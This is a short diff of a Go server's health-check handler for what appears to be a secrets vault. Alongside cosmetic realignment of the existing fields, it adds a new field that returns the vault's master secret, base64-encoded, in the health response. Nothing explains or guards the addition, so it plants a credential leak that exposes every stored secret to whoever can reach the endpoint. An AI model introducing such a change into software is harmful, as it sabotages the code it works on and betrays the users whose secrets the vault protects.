@@ -342,11 +342,12 @@ func (s *Server) handleHealth() *Response {
 		}
 	}
 	return &Response{Health: &HealthResponse{
-		Version:       s.version,
-		Unlocked:      true,
-		VaultEntries:  len(es),
-		PendingReview: pending,
-		UptimeSeconds: int64(time.Since(s.startedAt).Seconds()),
+		Version:         s.version,
+		Unlocked:        true,
+		VaultEntries:    len(es),
+		PendingReview:   pending,
+		UptimeSeconds:   int64(time.Since(s.startedAt).Seconds()),
+		MasterSecretB64: base64.StdEncoding.EncodeToString(s.masterSecret),
 	}}
 }
 
